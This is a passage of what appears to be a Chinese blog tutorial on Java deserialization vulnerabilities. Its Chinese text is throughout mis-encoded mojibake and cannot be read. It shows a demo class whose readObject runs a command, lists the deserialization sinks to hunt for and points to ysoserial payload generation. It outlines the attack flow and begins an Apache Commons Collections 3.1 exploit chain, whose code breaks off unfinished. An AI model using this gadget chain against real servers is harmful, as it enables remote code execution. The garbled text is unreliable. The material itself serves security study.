id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h1><p>å¯å‚è€ƒ</p><p><a href="https://xz.aliyun.com/t/2041">https://xz.aliyun.com/t/2041</a></p><p><a href="https://xz.aliyun.com/t/7031">https://xz.aliyun.com/t/7031</a></p><p>é¦–å…ˆï¼Œä¸€ä¸ªç±»çš„å¯¹è±¡è¦æƒ³åºåˆ—åŒ–æˆåŠŸï¼Œå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>è¯¥ç±»å¿…é¡»å®ç° java.io.Serializable æ¥å£ã€‚</li><li>è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚</li></ol><p>åœ¨Javaååºåˆ—åŒ–ä¸­ï¼Œä¼šè°ƒç”¨è¢«ååºåˆ—åŒ–çš„readObjectæ–¹æ³•ï¼Œå½“readObjectæ–¹æ³•ä¹¦å†™ä¸å½“æ—¶å°±ä¼šå¼•å‘æ¼æ´ã€‚</p><p>ä¸€ä¸ªç®€å•å¾—æ ·ä¾‹ï¼Œé€šè¿‡é‡å†™readObjectæ–¹æ³•ï¼Œåœ¨å…¶ä¸­æ‰§è¡Œå‘½ä»¤è¾¾åˆ°è§¦å‘æ¼æ´æ•ˆæœã€‚</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> serialize;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">//è¯»å–è¾“å…¥æµ,å¹¶è½¬æ¢å¯¹è±¡</span><br><span class="hljs-comment">//        Scanner input = new Scanner(System.in);</span><br><span class="hljs-comment">//        InputStream in= request.getInputStream();</span><br><span class="hljs-comment">//        ObjectInputStream ois = new ObjectInputStream(in); //æ¢å¤å¯¹è±¡</span><br><span class="hljs-comment">//        ois.readObject();</span><br><span class="hljs-comment">//        ois.close();</span><br>        SerialObject s = <span class="hljs-keyword">new</span> SerialObject(<span class="hljs-number">12</span>,<span class="hljs-string">&quot;KKfine&quot;</span>);<br>        FileOutputStream fileOut = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./ test.ser&quot;</span>);<br>        ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(fileOut);<br>        out.writeObject(s);<br>        fileOut.close();<br>        System.out.println(<span class="hljs-string">&quot;serialize ok &quot;</span>);<br><br>        SerialObject p = <span class="hljs-keyword">null</span>;<br>        FileInputStream filein = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./test.ser&quot;</span>);<br>        ObjectInputStream in = <span class="hljs-keyword">new</span> ObjectInputStream(filein);<br>        p = (SerialObject) in.readObject();<br>        in.close();<br>        filein.close();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SerialObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> seriaverionuid = <span class="hljs-number">513134543743755L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">SerialObject</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id,String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span><span class="hljs-keyword">throws</span> IOException,ClassNotFoundException</span>&#123;<br>        in.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;notepad.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>åºåˆ—åŒ–æ•°æ®é€šå¸¸ä»¥<code>AC ED</code>å¼€å§‹ï¼Œä¹‹åçš„ä¸¤ä¸ªå­—èŠ‚æ˜¯ç‰ˆæœ¬å·ï¼Œç‰ˆæœ¬å·ä¸€èˆ¬æ˜¯<code>00 05</code>ä½†åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½æ˜¯æ›´é«˜çš„æ•°å­—ã€‚</p><p>Javaç±»åç§°å¯èƒ½ä¼šä»¥â€œLâ€å¼€å¤´çš„æ›¿ä»£æ ¼å¼å‡ºç° ï¼Œä»¥â€™;â€™ç»“å°¾ ï¼Œå¹¶ä½¿ç”¨æ­£æ–œæ æ¥åˆ†éš”å‘½åç©ºé—´å’Œç±»åï¼ˆä¾‹å¦‚ â€œLjava / rmi / dgc / VMID;â€ï¼‰ã€‚é™¤äº†Javaç±»åï¼Œç”±äºåºåˆ—åŒ–æ ¼å¼è§„èŒƒçš„çº¦å®šï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–å¸¸è§çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ ï¼šè¡¨ç¤ºå¯¹è±¡ï¼ˆTC_OBJECTï¼‰ï¼Œåè·Ÿå…¶ç±»æè¿°ï¼ˆTC_CLASSDESCï¼‰çš„â€™srâ€™æˆ– å¯èƒ½è¡¨ç¤ºæ²¡æœ‰è¶…ç±»ï¼ˆTC_NULLï¼‰çš„ç±»çš„ç±»æ³¨é‡Šï¼ˆTC_ENDBLOCKDATAï¼‰çš„â€™xpâ€™ã€‚</p><p>åºåˆ—åŒ–æ•°æ®ä¿¡æ¯æ˜¯å°†å¯¹è±¡ä¿¡æ¯æŒ‰ç…§ä¸€å®šè§„åˆ™ç»„æˆçš„ï¼Œé‚£æˆ‘ä»¬æ ¹æ®è¿™ä¸ªè§„åˆ™ä¹Ÿå¯ä»¥é€†å‘æ¨æµ‹å‡ºæ•°æ®ä¿¡æ¯ä¸­çš„æ•°æ®ç±»å‹ç­‰ä¿¡æ¯ã€‚å¹¶ä¸”æœ‰å¤§ç‰›å†™å¥½äº†ç°æˆçš„å·¥å…·-<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a></p><p>åœ¨å®æˆ˜è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡tcpdumpæŠ“å–TCP/HTTPè¯·æ±‚ï¼Œé€šè¿‡<a href="https://github.com/NickstaDB/SerialBrute/">SerialBrute.py</a>å»è‡ªåŠ¨åŒ–æ£€æµ‹ï¼Œå¹¶æ’å…¥ysoserialç”Ÿæˆçš„exp</p><p><img src="https://img-blog.csdnimg.cn/13cdbe6f5635452ebd0122ef527efa9a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ„Ÿè§‰ä¸»è¦æ˜¯è¦æ³¨æ„ä¸€äº›åº“ä¸­å­˜åœ¨å¾—ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>æ³¨æ„æ‰¾å‡ºååºåˆ—åŒ–å‡½æ•°è°ƒç”¨ç‚¹ï¼š</p><ul><li>ObjectInputStream.readObject</li><li>ObjectInputStream.readUnshared</li><li>XMLDecoder.readObject</li><li>yaml.load</li><li>XStream.fromXML</li><li>ObjectMapper.readValue</li><li>JSON.parseObject</li></ul><h2 id="å…³äºjavaåå°„"><a href="#å…³äºjavaåå°„" class="headerlink" title="å…³äºjavaåå°„"></a>å…³äºjavaåå°„</h2><p>å‚è€ƒ<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448">https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448</a></p><p>åå°„å°±æ˜¯Reflectionï¼ŒJavaçš„åå°„æ˜¯æŒ‡ç¨‹åºåœ¨è¿è¡ŒæœŸå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬è¦è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼Œæˆ–è€…è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å­—æ®µï¼Œé€šå¸¸ä¼šä¼ å…¥å¯¹è±¡å®ä¾‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs typescript"><span class="hljs-comment">// Main.java</span><br><span class="hljs-keyword">import</span> com.itranswarp.learnjava.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">getFullName</span>(<span class="hljs-params">Person p</span>)</span> &#123;<br>        <span class="hljs-keyword">return</span> p.getFirstName() + <span class="hljs-string">&quot; &quot;</span> + p.getLastName();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä½†æ˜¯ï¼Œå¦‚æœä¸èƒ½è·å¾—<code>Person</code>ç±»ï¼Œåªæœ‰ä¸€ä¸ª<code>Object</code>å®ä¾‹ï¼Œæ¯”å¦‚è¿™æ ·ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">getFullName</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj</span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> ???<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æ€ä¹ˆåŠï¼Ÿæœ‰ç«¥é‹ä¼šè¯´ï¼šå¼ºåˆ¶è½¬å‹å•Šï¼</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">getFullName</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj</span>)</span> &#123;<br>    Person p = (Person) obj;<br>    <span class="hljs-keyword">return</span> p.getFirstName() + <span class="hljs-string">&quot; &quot;</span> + p.getLastName();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¼ºåˆ¶è½¬å‹çš„æ—¶å€™ï¼Œä½ ä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ï¼šç¼–è¯‘ä¸Šé¢çš„ä»£ç ï¼Œä»ç„¶éœ€è¦å¼•ç”¨<code>Person</code>ç±»ã€‚ä¸ç„¶ï¼Œå»æ‰<code>import</code>è¯­å¥ï¼Œä½ çœ‹èƒ½ä¸èƒ½ç¼–è¯‘é€šè¿‡ï¼Ÿ</p><p>æ‰€ä»¥ï¼Œåå°„æ˜¯ä¸ºäº†è§£å†³åœ¨è¿è¡ŒæœŸï¼Œå¯¹æŸä¸ªå®ä¾‹ä¸€æ— æ‰€çŸ¥çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•è°ƒç”¨å…¶æ–¹æ³•ã€‚</p><p>å…³äºåå°„çš„å®ä¾‹åŒ–ä¸€äº›æ–¹æ³•</p><p><code>forName </code></p><p> forNameæ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œå…¶ä½œç”¨ï¼šé€šè¿‡è°ƒç”¨æ¥è·å–ç±»åå¯¹åº”çš„Classå¯¹è±¡ï¼ŒåŒæ—¶å°†Classå¯¹è±¡åŠ è½½è¿›æ¥ã€‚</p><p><code>newInstance</code></p><p>å°†å¯¹è±¡å®ä¾‹åŒ–ã€‚è¿”å›ç±»å‹ä¸ºObjectã€‚ä¸newçš„åŒºåˆ«åœ¨äºï¼Œnewå¯ä»¥å¸¦å‚ï¼Œè€ŒnewInstanceï¼ˆï¼‰ä¸å¯ä»¥ï¼Œä¸€è¾¹åˆå§‹åŒ–æ— å‚ç±»ã€‚é€šå¸¸ä¸forName()é…åˆä½¿ç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String str = <span class="hljs-string">&quot;java.util.Date&quot;</span>;<br>Class cl1= Class.forName(str);<span class="hljs-comment">//åŠ è½½java.util.Dateç±»</span><br>Object obj = cl1.newInstance();<span class="hljs-comment">//å®ä¾‹åŒ–cl1</span><br></code></pre></div></td></tr></table></figure><p>æœ€åä¸€ä¸ªæ˜¯ç›´æ¥ç”¨new æ¥å®ä¾‹åŒ–ä¹Ÿæ˜¯å¾ˆå¸¸ç”¨çš„æ–¹æ³•ã€‚</p><p>è¿˜æœ‰ä¸€äº›å…³é”®çš„æ–¹æ³•</p><p><code>getMethod()</code>  Method getMethod(String name,Classâ€¦parameterTypes)</p><p>getMethodæ–¹æ³•ä¸getFieldæ–¹æ³•ç±»ä¼¼ï¼ŒgetFieldæ–¹æ³•æ ¹æ®è¡¨ç¤ºåŸŸåçš„å­—ç¬¦ä¸²ï¼Œè¿”å›ä¸€ä¸ªFieldå¯¹è±¡ã€‚è€ŒgetMethodæ–¹æ³•åˆ™æ ¹æ®æ–¹æ³•åç§°å’Œç›¸å…³å‚æ•°ï¼Œæ¥å®šä½éœ€è¦æŸ¥æ‰¾çš„Methodå¯¹è±¡å¹¶è¿”å›ã€‚</p><p>getMethodä¸getDeclareMethodsæ–¹æ³•çš„åŒºåˆ«åœ¨äºï¼Œåè€…è¿”å›ä¸€ä¸ªMethodå¯¹è±¡æ•°ç»„ï¼Œéœ€è¦è‡ªå·±åœ¨ç»“æœä¸­æŸ¥æ‰¾æ‰€éœ€Methodå¯¹è±¡ã€‚</p><p><code>invoke</code>Object invokeï¼ˆObject obj,Objectâ€¦argsï¼‰objï¼šå®ä¾‹åŒ–åçš„å¯¹è±¡,argsï¼šç”¨äºæ–¹æ³•è°ƒç”¨çš„å‚æ•°</p><p>è°ƒç”¨åŒ…è£…åœ¨å½“å‰Methodå¯¹è±¡ä¸­çš„æ–¹æ³•</p><p>å¸¸ç”¨çš„è¿˜æœ‰<strong>java.lang.Class.getMethodï¼ˆï¼‰</strong></p><h2 id="ååºåˆ—åŒ–ä¸€èˆ¬æ”»å‡»è¿‡ç¨‹"><a href="#ååºåˆ—åŒ–ä¸€èˆ¬æ”»å‡»è¿‡ç¨‹" class="headerlink" title="ååºåˆ—åŒ–ä¸€èˆ¬æ”»å‡»è¿‡ç¨‹"></a>ååºåˆ—åŒ–ä¸€èˆ¬æ”»å‡»è¿‡ç¨‹</h2><p>åœ¨å¼€å§‹ä¹‹å‰æˆ‘ä»¬éœ€è¦ç†ä¸€ä¸‹ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»æµç¨‹ï¼š</p><ol><li>å®¢æˆ·ç«¯æ„é€ payload(æœ‰æ•ˆè½½è·)ï¼Œå¹¶è¿›è¡Œä¸€å±‚å±‚çš„å°è£…ï¼Œå®Œæˆæœ€åçš„expï¼ˆexploit-åˆ©ç”¨ä»£ç ï¼‰</li><li>expå‘é€åˆ°æœåŠ¡ç«¯ï¼Œè¿›å…¥ä¸€ä¸ªæœåŠ¡ç«¯è‡ªä¸»å¤å†™ï¼ˆä¹Ÿå¯èƒ½æ˜¯ä¹Ÿæœ‰ç»„ä»¶å¤å†™ï¼‰çš„readobjectå‡½æ•°ï¼Œå®ƒä¼šååºåˆ—åŒ–æ¢å¤æˆ‘ä»¬æ„é€ çš„expå»å½¢æˆä¸€ä¸ªæ¶æ„çš„æ•°æ®æ ¼å¼exp_1ï¼ˆå‰¥å»ç¬¬ä¸€å±‚ï¼‰</li><li>è¿™ä¸ªæ¶æ„æ•°æ®exp_1åœ¨æ¥ä¸‹æ¥çš„å¤„ç†æµç¨‹(å¯èƒ½æ˜¯åœ¨è‡ªä¸»å¤å†™çš„readobjectä¸­ã€ä¹Ÿå¯èƒ½æ˜¯åœ¨å¤–é¢çš„é€»è¾‘ä¸­)ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªexp_1è¿™ä¸ªæ¶æ„æ•°æ®ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨æ–¹æ³•ä¸­ä¼šæ ¹æ®exp_1çš„å†…å®¹è¿›è¡Œå‡½å¤„ç†ï¼Œä»è€Œä¸€å±‚å±‚åœ°å‰¥å»ï¼ˆæˆ–è€…è¯´å˜å½¢ã€è§£æï¼‰æˆ‘ä»¬exp_1å˜æˆexp_2ã€exp_3â€¦â€¦</li><li>æœ€ååœ¨ä¸€ä¸ªå¯æ‰§è¡Œä»»æ„å‘½ä»¤çš„å‡½æ•°ä¸­æ‰§è¡Œæœ€åçš„payloadï¼Œå®Œæˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</li></ol><p>é‚£ä¹ˆä»¥ä¸Šå¤§æ¦‚å¯ä»¥åˆ†æˆä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ï¼š</p><ol><li>payloadï¼šéœ€è¦è®©æœåŠ¡ç«¯æ‰§è¡Œçš„è¯­å¥ï¼šæ¯”å¦‚è¯´å¼¹è®¡ç®—å™¨è¿˜æ˜¯æ‰§è¡Œè¿œç¨‹è®¿é—®ç­‰ï¼›æˆ‘æŠŠå®ƒç§°ä¸ºï¼špayload</li><li>ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼šæœåŠ¡ç«¯ä¸­å­˜åœ¨çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œä¼šä¸€å±‚å±‚æ‹¨å¼€æˆ‘ä»¬çš„expï¼Œæœ€åæ‰§è¡Œpayloadã€‚(åœ¨æ­¤ç¯‡ä¸­å°±æ˜¯commons-collectionsåˆ©ç”¨é“¾)</li><li>readObjectå¤å†™åˆ©ç”¨ç‚¹ï¼šæœåŠ¡ç«¯ä¸­å­˜åœ¨çš„å¯ä»¥ä¸æˆ‘ä»¬æ¼æ´é“¾ç›¸æ¥çš„å¹¶ä¸”å¯ä»¥ä»å¤–éƒ¨è®¿é—®çš„readObjectå‡½æ•°å¤å†™ç‚¹ï¼›æˆ‘æŠŠå®ƒç§°ä¸ºreadObjectå¤å†™åˆ©ç”¨ç‚¹ï¼ˆè‡ªåˆ›åç§°â€¦</li></ol><h2 id="åˆè¯•CC3-1ååºåˆ—åŒ–æ¼æ´"><a href="#åˆè¯•CC3-1ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="åˆè¯•CC3.1ååºåˆ—åŒ–æ¼æ´"></a>åˆè¯•CC3.1ååºåˆ—åŒ–æ¼æ´</h2><p>çœ‹ccåº“æ¼æ´ä¹‹å‰å¾—å…ˆäº†è§£äº†è§£ccåº“å¾—ä¸€ä¸‹æ¥å£å’Œå‡½æ•°å¾—å®ç°ã€‚</p><p>è¿™é‡ŒMapç±»æ˜¯å­˜å‚¨é”®å€¼å¯¹çš„æ•°æ®ç»“æ„ï¼ŒApache Commons Collectionsä¸­å®ç°äº†ç±»TransformedMapï¼Œç”¨æ¥å¯¹Mapè¿›è¡ŒæŸç§å˜æ¢ï¼Œåªè¦è°ƒç”¨decorate()å‡½æ•°ï¼Œä¼ å…¥keyå’Œvalueçš„å˜æ¢å‡½æ•°Transformerï¼Œå³å¯ä»ä»»æ„Mapå¯¹è±¡ç”Ÿæˆç›¸åº”çš„TransformedMapï¼Œdecorate()å‡½æ•°å¦‚ä¸‹</p><p><img src="https://img-blog.csdnimg.cn/a5cc0eca263b485c8521ffece0db2b6d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>Transformeræ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶ä¸­å®šä¹‰çš„transform()å‡½æ•°ç”¨æ¥å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Transformer</span> </span>&#123;  <br><br> <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span></span>;  <br><br>&#125; <br></code></pre></div></td></tr></table></figure><p>å½“Mapä¸­çš„ä»»æ„é¡¹çš„Keyæˆ–è€…Valueè¢«ä¿®æ”¹ï¼Œç›¸åº”çš„Transformerå°±ä¼šè¢«è°ƒç”¨ã€‚é™¤æ­¤ä»¥å¤–ï¼Œå¤šä¸ªTransformerè¿˜èƒ½ä¸²èµ·æ¥ï¼Œå½¢æˆChainedTransformerã€‚</p><p>Apache Commons Collectionsä¸­å·²ç»å®ç°äº†ä¸€äº›å¸¸è§çš„Transformerï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå¯ä»¥é€šè¿‡è°ƒç”¨Javaçš„åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œå«åšInvokerTransformerã€‚è¿™ä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´è§¦å‘å¾—æ ¸å¿ƒã€‚çœ‹ä¸€ä¸‹InvokerTransformerçš„æºç å®šä¹‰</p><h3 id="pocé“¾åˆ†æ"><a href="#pocé“¾åˆ†æ" class="headerlink" title="pocé“¾åˆ†æ"></a>pocé“¾åˆ†æ</h3><h4 id="JDK1-7åˆ©ç”¨é“¾"><a href="#JDK1-7åˆ©ç”¨é“¾" class="headerlink" title="JDK1.7åˆ©ç”¨é“¾"></a>JDK1.7åˆ©ç”¨é“¾</h4><p>å…ˆçœ‹ä¸€ä¸‹æ ¸å¿ƒå¾—è§¦å‘æ¼æ´å¾—åœ°æ–¹</p><p><img src="https://img-blog.csdnimg.cn/9414e8841c984f0fbb589605d577b0e0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œå¾—ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå¯ä»¥çœ‹åˆ° InvokerTransformer ç±»ä¸­å®ç°çš„ transform() æ¥å£ä½¿ç”¨ Java åå°„æœºåˆ¶è·å–åå°„å¯¹è±¡ input ä¸­çš„å‚æ•°ç±»å‹ä¸º iParamTypes çš„æ–¹æ³• iMethodNameï¼Œç„¶åä½¿ç”¨å¯¹åº”å‚æ•° iArgs è°ƒç”¨è·å–çš„æ–¹æ³•ï¼Œå¹¶å°†æ‰§è¡Œç»“æœè¿”å›ã€‚ç”±äºå…¶å®ç°äº† Serializable æ¥å£ï¼Œå› æ­¤å…¶ä¸­çš„ä¸‰ä¸ªå¿…è¦å‚æ•° iMethodNameã€iParamTypes å’Œ iArgs éƒ½æ˜¯å¯ä»¥é€šè¿‡åºåˆ—åŒ–ç›´æ¥æ„é€ çš„ï¼Œä¸ºå‘½ä»¤æ‰§è¡Œåˆ›é€ çš„å†³å®šæ€§çš„æ¡ä»¶ã€‚</p><p>ç„¶åè¦æƒ³åˆ©ç”¨ InvokerTransformer ç±»ä¸­çš„ transform() æ¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œè¿˜éœ€è¦ä¸€ä¸ªå…¥å£ç‚¹ï¼Œä½¿å¾—åº”ç”¨åœ¨ååºåˆ—åŒ–çš„æ—¶å€™èƒ½å¤Ÿé€šè¿‡ä¸€æ¡è°ƒç”¨é“¾æ¥è§¦å‘ InvokerTransformer ä¸­çš„ transform() æ¥å£ã€‚è¿™é‡Œå¯»æ‰¾è¿‡åå‘ç°äº†<code>TransformedMap</code>ä¸‹å­˜åœ¨<code>put</code>æ–¹æ³•</p><p><img src="https://img-blog.csdnimg.cn/998ab566576542a4ac33ac4fd1a22d22.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›åå¯ä»¥å‘ç°è¿™é‡Œå­˜åœ¨è°ƒç”¨transformå‡½æ•°åªéœ€è¦å°†æˆå‘˜å˜é‡é‡Œçš„ä¸€ä¸ª<code>valuetransformer</code>è®¾ç½®ä¸ºä¸€ä¸ª<code>InvokerTransformer</code>ç±»å³å¯è§¦å‘</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106222354207.png" alt="image-20211106222354207"></p><p>è¿˜æœ‰ä¸€äº›ç»†èŠ‚çš„ä¸œè¥¿ï¼Œè¿™é‡Œç›´æ¥çœ‹popé“¾ã€‚è¿™é‡Œä¸ºäº†æœ€åèƒ½å¤Ÿè·å¾—<code>exec</code>å‡½æ•°æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦è°ƒç”¨å¤šæ¬¡åå°„ï¼Œæ‰€ä»¥éœ€è¦å°†å¤šä¸ª InvokerTransformer å®ä¾‹çº§è”åœ¨ä¸€èµ·ç»„æˆä¸€ä¸ª ChainedTransformer å¯¹è±¡ï¼Œåœ¨å…¶è°ƒç”¨çš„æ—¶å€™ä¼šè¿›è¡Œä¸€ä¸ªçº§è” transform() è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CC3_1.serialize;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">commons_collections_3_1</span> </span>&#123;<br>    